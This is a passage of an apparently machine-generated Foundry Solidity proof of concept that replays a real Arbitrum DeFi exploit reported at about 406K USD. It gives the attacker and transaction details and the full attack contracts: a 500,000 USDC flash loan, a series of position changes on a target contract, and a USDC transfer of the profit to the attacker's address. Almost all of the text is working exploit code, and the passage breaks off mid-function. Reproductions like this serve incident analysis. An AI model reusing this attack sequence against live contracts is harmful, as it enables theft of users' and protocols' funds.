// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 406.22K USD
// Attacker : 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95
// Attack Contract : 0x21eda2e3ad975fde9c81769e15ed8e1532eb08a4
// Vulnerable Contract : N/A
// Attack Tx : 0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
// Block : 419829771
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 395.15K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 419829770;
    uint256 constant TX_TIMESTAMP = 1768033835;
    uint256 constant TX_BLOCK_NUMBER = 419829771;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _installAttackChildR();
        attack.bindAttackChildContracts();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_contract_6CB5;
    }

    function _installRuntimeFallb() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _installAttackChildR() internal {
        // Exact-address fallback for attack child contracts that were dynamically created in the trace.
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=Addresses.attack_contract_6CB5 constructor=0x348df930e825da25552d8b3dc44e871c67846cb5|entry|entry|len:14185|input:a5b2d684e36cc0a2|ct:CREATE|attacker_internal runtime_selectors=2 initcode_sha256=0xa5b2d684e36cc0a2c52b2cb457d3699b7c14b5d4570781a9250b8766212b2ec8 fallback_reasons=none
        vm.etch(Addresses.attack_contract_6CB5, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=Addresses.attack_child constructor=0x8c6be2e20306dd1ec40a7e76f40310943953ba7f|entry|entry|len:1777|input:37526454cb7627bf|ct:CREATE|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x37526454cb7627bf439030db89391a87e8d44c83268bed73aa8b9b630ce6cc9e fallback_reasons=none
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=Addresses.attack_child_7BEB constructor=0xea09ea354009818776d41f8e2a9dcdfc9c4e7beb|entry|entry|len:1712|input:02bb2b181861af80|ct:CREATE|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x02bb2b181861af80f22a286aff56f1c60e5aba55ae80e5a69bd4196ed827f927 fallback_reasons=none
        vm.etch(Addresses.attack_child_7BEB, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=Addresses.attack_child_6635 constructor=0xf1b426708d6ecf02274a789bbc10a94a1b5a6635|entry|entry|len:2721|input:ab13436e41a37a98|ct:CREATE|dynamic_instantiation runtime_selectors=2 initcode_sha256=0xab13436e41a37a983dd2798d52102f018b08baf986c81a7a5ab1223fc57a34ad fallback_reasons=none
        vm.etch(Addresses.attack_child_6635, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_625E77_B4CD, address(0), Addresses.USDC_5CC8, "USDC", 500250000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC_5CC8, "USDC", 394742852305);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;
    AttackChild public attackChild_2;
    AttackChild public attackChild_3;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild) constructor=0x348df930e825da25552d8b3dc44e871c67846cb5|entry|entry|len:14185|input:a5b2d684e36cc0a2|ct:CREATE|attacker_internal runtime_selectors=2 initcode_sha256=0xa5b2d684e36cc0a2c52b2cb457d3699b7c14b5d4570781a9250b8766212b2ec8 fallback_reasons=none
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild_1) constructor=0x8c6be2e20306dd1ec40a7e76f40310943953ba7f|entry|entry|len:1777|input:37526454cb7627bf|ct:CREATE|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x37526454cb7627bf439030db89391a87e8d44c83268bed73aa8b9b630ce6cc9e fallback_reasons=none
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild_2) constructor=0xea09ea354009818776d41f8e2a9dcdfc9c4e7beb|entry|entry|len:1712|input:02bb2b181861af80|ct:CREATE|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x02bb2b181861af80f22a286aff56f1c60e5aba55ae80e5a69bd4196ed827f927 fallback_reasons=none
        if (address(attackChild_2) == address(0)) {
            attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild_3) constructor=0xf1b426708d6ecf02274a789bbc10a94a1b5a6635|entry|entry|len:2721|input:ab13436e41a37a98|ct:CREATE|dynamic_instantiation runtime_selectors=2 initcode_sha256=0xab13436e41a37a983dd2798d52102f018b08baf986c81a7a5ab1223fc57a34ad fallback_reasons=none
        if (address(attackChild_3) == address(0)) {
            attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_contract_6CB5));
            attackChild_1 = AttackChild(payable(Addresses.attack_child));
            attackChild_2 = AttackChild(payable(Addresses.attack_child_7BEB));
            attackChild_3 = AttackChild(payable(Addresses.attack_child_6635));
        }

        address childRunFrame = address(attackChild);
        require(childRunFrame.code.length != 0, "observed attack child runtime missing");
        AttackChild(payable(childRunFrame)).run();

        if (Addresses.USDC_5CC8.code.length != 0) {
            IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, 394742852305);
        } else {
            console2.log("PoCWarning", "skipping missing-code observed typed call", "USDC");
        }
    }

    function _call() internal {
        _replayProtocolCalls();
    }

    function _replayProtocolCalls() internal {
        {
            bytes memory observedCallData =
                hex"42b0b77c000000000000000000000000348df930e825da25552d8b3dc44e871c67846cb5000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8000000000000000000000000000000000000000000000000000000746a52880000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0020 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.A_794A61_14AD.call(observedCallData);
            require(ok, "observed raw calldata 0x42b0b77c failed");
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount = 394742852305;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_contract, transferActionGraphAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _deployAttackChildCo() public {
        {
            address created = address(attackChild_3);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_3)))._handleFlashLoanCa4();
        {
            address created = address(attackChild_1);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_1)))._handleFlashLoanCall();
        {
            address created = address(attackChild_2);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_2)))._handleFlashLoanCa3();
    }

    receive() external payable {}

    function run() external payable {
        _call();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
        attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
        attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
        attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackChild {
    receive() external payable {}

    function executeOperation(address arg0, uint256 amount, uint256 amount1, address arg3, bytes calldata arg4)
        external
        payable
        returns (bool)
    {
        arg0;
        amount;
        amount1;
        arg3;
        arg4;
        if (!_replayDone[REPLAY_CALLBACK_4]) _execOp();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    function openPosition() external payable {
        _handleAttackChildCa();
        return;
    }

    function zeroPool() external payable {
        _handleAttackChild3();
        return;
    }

    function drain() external payable {
        _handleAttackChild2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x7ef540b0) {
            _handleFlashLoanCa2();
            return;
        }
        _entryCb();
    }

    function run() external payable {
        _runFlashLoan();
    }

    function execOp() external payable {
        if (!_replayDone[REPLAY_CALLBACK_4]) _execOp();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function attackChildCb2() external payable {
        _handleAttackChildCa();
        return;
    }

    function flashLoanCallback4() external payable {
        _handleFlashLoanCa2();
        return;
    }

    function attackChildCb() external payable {
        _handleAttackChild3();
        return;
    }

    function attackChildCb3() external payable {
        _handleAttackChild2();
        return;
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _execOp() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        _replayProtocolCalls();
        _settleTokenFlows();
        _settleTokenFlows2();
        _replayProtocolCal3();
    }

    function _runFlashLoan() internal {
        IContract_794A61_14AD(Addresses.A_794A61_14AD)
            .flashLoanSimple(Addresses.attack_contract_6CB5, Addresses.USDC_5CC8, 500000000000, hex"", 0);
        if (Addresses.USDC_5CC8.code.length != 0) {
            IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
            IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_contract, 394742852305);
        } else {
            console2.log("PoCWarning", "skipping missing-code observed typed call", "USDC");
        }
    }

    function _replayProtocolCalls() internal {
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).updateFunding();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _settleTokenFlows() internal {
        {
            uint256 usdc5cc8TransferAmount = 1000000000; // value provenance: arg1=1000000000 is covered by prior Addresses.USDC_5CC8.balanceOf(address) return=500000000000 with args (Addresses.attack_contract_6CB5)
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, usdc5cc8TransferAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        AttackChild(payable(Addresses.attack_child_6635)).attackChildCb2();
        {
            uint256 usdc5cc8TransferAmount_2 = 2000000000; // value provenance: arg1=2000000000 is covered by prior Addresses.USDC_5CC8.balanceOf(address) return=500000000000 with args (Addresses.attack_contract_6CB5)
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, usdc5cc8TransferAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        AttackChild(payable(Addresses.attack_child)).attackChildCb();
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _settleTokenFlows2() internal {
        {
            uint256 usdc5cc8TransferAmount_3 = 500000000; // value provenance: arg1=500000000 is covered by prior Addresses.USDC_5CC8.balanceOf(address) return=500000000000 with args (Addresses.attack_contract_6CB5)
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, usdc5cc8TransferAmount_3);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        AttackChild(payable(Addresses.attack_child_7BEB)).flashLoanCallback4();
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 approveActionGraphAllowance = 496500000000;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        {
            int256 aF7ca7380bcChangePositionAmount = 496500000000; // value provenance: arg1=496500000000 matches prior Addresses.USDC_5CC8.balanceOf(address) return with args (Addresses.attack_contract_6CB5)
            {
                if (Addresses.A_F7CA73_80BC.code.length != 0) {
                    IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                        .changePosition(
                            int256(-68000000000000000000), int256(aF7ca7380bcChangePositionAmount), int256(0)
                        );
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _replayProtocolCal3() internal {
        AttackChild(payable(Addresses.attack_child_6635)).attackChildCb3();
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 usdc5cc8ApproveAllowance = 500250000000; // value provenance: arg1=500250000000 is covered by prior Addresses.USDC_5CC8.balanceOf(address) return=894992852305 with args (Addresses.attack_contract_6CB5)
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_794A61_14AD, usdc5cc8ApproveAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _handleAttackChild3() internal {
        _readPoolState();
    }

    function _readPoolState() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 approveActionGraphAllowance = 2000000000;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        {
            int256 aF7ca7380bcChangePositionAmount = 2000000000; // value provenance: arg1=2000000000 matches prior Addresses.USDC_5CC8.balanceOf(address) return with args (Addresses.attack_child)
            {
                if (Addresses.A_F7CA73_80BC.code.length != 0) {
                    IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                        .changePosition(int256(324678582642240534), int256(aF7ca7380bcChangePositionAmount), int256(0));
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _handleFlashLoanCall() public {}

    function _handleFlashLoanCa2() internal {
        _readPoolState2();
    }

    function _readPoolState2() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 approveActionGraphAllowance = 500000000;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        {
            int256 aF7ca7380bcChangePositionAmount = 500000000; // value provenance: arg1=500000000 matches prior Addresses.USDC_5CC8.balanceOf(address) return with args (Addresses.attack_child_7BEB)
            {
                if (Addresses.A_F7CA73_80BC.code.length != 0) {
                    IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                        .changePosition(int256(1000000000000000), int256(aF7ca7380bcChangePositionAmount), int256(0));
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _handleFlashLoanCa3() public {}

    function _handleAttackChildCa() internal {
        _readPoolState3();
    }

    function _readPoolState3() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 approveActionGraphAllowance = 1000000000;
            {
                if (Addresses.USDC_5CC8.code.length != 0) {
                    IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDC_5CC8 = 0xff970a61a04b1ca14834a43f5de4533ebddb5cc8 label=USDC token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
        {
            int256 aF7ca7380bcChangePositionAmount = 1000000000; // value provenance: arg1=1000000000 matches prior Addresses.USDC_5CC8.balanceOf(address) return with args (Addresses.attack_child_6635)
            {
                if (Addresses.A_F7CA73_80BC.code.length != 0) {
                    IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                        .changePosition(int256(100000000000000000), int256(aF7ca7380bcChangePositionAmount), int256(0));
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _handleAttackChild2() internal {
        _replayProtocolCal2();
    }

    function _replayProtocolCal2() internal {
        {
            if (Addresses.USDC_5CC8.code.length != 0) {
                IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.A_F7CA73_80BC);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
